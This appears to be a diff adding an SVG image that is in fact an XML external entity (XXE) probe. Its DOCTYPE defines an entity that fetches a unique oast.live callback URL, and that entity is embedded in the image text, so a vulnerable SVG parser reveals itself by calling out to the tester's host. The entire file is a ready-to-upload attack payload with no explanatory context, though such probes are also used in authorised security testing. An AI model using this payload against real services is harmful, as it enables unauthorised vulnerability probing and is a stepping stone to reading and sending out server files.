@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://dbudbhvkg4408lmmq0ng768btf5k8jixp.oast.live/svg-xxe-entity-hit"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
+  <rect width="200" height="100" fill="#3498db"/>
+  <text x="10" y="50" font-size="20" fill="white">XXE &xxe;</text>
+</svg>
